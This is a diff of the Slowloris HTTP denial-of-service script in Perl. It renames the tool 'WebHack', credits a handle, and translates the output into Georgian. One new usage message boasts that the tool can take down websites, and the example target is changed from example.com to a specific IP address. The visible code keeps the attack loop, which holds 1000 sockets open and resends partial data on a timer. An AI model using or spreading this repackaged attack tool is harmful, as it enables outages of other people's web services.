@@ -8,7 +8,7 @@ use Config;
 $SIG{'PIPE'} = 'IGNORE';    #Ignore broken pipe errors
 
 print <<EOTEXT;
-Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client by Laera Loris
+Welcome to WebHack - დაბალი სიჩქარის, ჯერჯერობით ხარბ და შხამიანი HTTP კლიენტი By X:xUzManN/A/
 EOTEXT
 
 my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
@@ -33,8 +33,8 @@ if ($version) {
 }
 
 unless ($host) {
-    print "Usage:\n\n\tperl $0 -dns [www.example.com] -options\n";
-    print "\n\tType 'perldoc $0' for help with options.\n\n";
+    print "Magalitad:\n\n\t $0 -dns [80.241.252.222] -options\n";
+    print "\n\tType 'Ase ro Amit Shegidzliat marto Gatishot Saitebi !!!.\n\n";
     exit;
 }
 
@@ -45,30 +45,30 @@ unless ($port) {
 
 unless ($tcpto) {
     $tcpto = 5;
-    print "Defaulting to a 5 second tcp connection timeout.\n";
+    print "5 Wamshi Boti Igzavneba.\n";
 }
 
 unless ($test) {
     unless ($timeout) {
         $timeout = 100;
-        print "Defaulting to a 100 second re-try timeout.\n";
+        print "100 wamshi igzavneba .\n";
     }
     unless ($connections) {
         $connections = 1000;
-        print "Defaulting to 1000 connections.\n";
+        print "1000 boti.\n";
     }
 }
 
 my $usemultithreading = 0;
 if ( $Config{usethreads} ) {
-    print "Multithreading enabled.\n";
+    print "Mimdinareobs Botingi.\n";
     $usemultithreading = 1;
     use threads;
     use threads::shared;
 }
 else {
     print "No multithreading capabilites found!\n";
-    print "Slowloris will be slower than normal as a result.\n";
+    print "WebHack will be slower than normal as a result.\n";
 }
 
 my $packetcount : shared     = 0;
@@ -173,7 +173,7 @@ if ($test) {
     }
 
     if ( print $sock "Connection: Close\r\n\r\n" ) {
-        print "Okay that's enough time. Slowloris closed the socket.\n";
+        print "Okay that's enough time. WebHack closed the socket.\n";
         print "Use $delay seconds for -timeout.\n";
         exit;
     }
@@ -194,7 +194,7 @@ EOSUCKS2BU
 }
 else {
     print
-"Connecting to $host:$port every $timeout seconds with $connections sockets:\n";
+"Igzavneba $host:$port Yovel $timeout Wamshi $connections Boti:\n";
 
     if ($usemultithreading) {
         domultithreading($connections);
@@ -212,7 +212,7 @@ sub doconnections {
     $first[$_]   = 0 foreach ( 1 .. $num );    #initializing
     while (1) {
         $failedconnections = 0;
-        print "\t\tBuilding sockets.\n";
+        print "\t\tIgzavneba!!! By X:xUzManN/A/.\n";
         foreach my $z ( 1 .. $num ) {
             if ( $working[$z] == 0 ) {
                 if ($ssl) {
@@ -287,7 +287,7 @@ sub doconnections {
                 }
             }
         }
-        print "\t\tSending data.\n";
+        print "\t\tIgzavneba.\n";
         foreach my $z ( 1 .. $num ) {
             if ( $working[$z] == 1 ) {
                 if ( $sock[$z] ) {
@@ -312,7 +312,7 @@ sub doconnections {
             }
         }
         print
-"Current stats:\tSlowloris has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
+"Botebis Raodenoba:\tWebHack Miaywia $packetcount Botze .\nYovel $timeout Wamshi...\n\n";
         sleep($timeout);
     }
 }
